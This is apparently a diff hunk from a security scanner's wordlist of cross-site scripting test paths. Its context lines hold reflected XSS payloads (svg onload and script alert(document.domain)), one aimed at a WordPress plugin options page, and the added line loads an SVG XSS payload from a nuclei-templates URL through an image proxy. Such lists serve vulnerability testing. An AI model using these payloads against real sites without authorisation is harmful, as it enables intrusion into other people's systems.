@@ -989,3 +989,4 @@ request?info=<svg onload=alert(
 /
 /?ru&filter=%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
 /wp-admin/options-general.php?page=login-configurator-options&tab=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E#top
+/o/get/image?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg
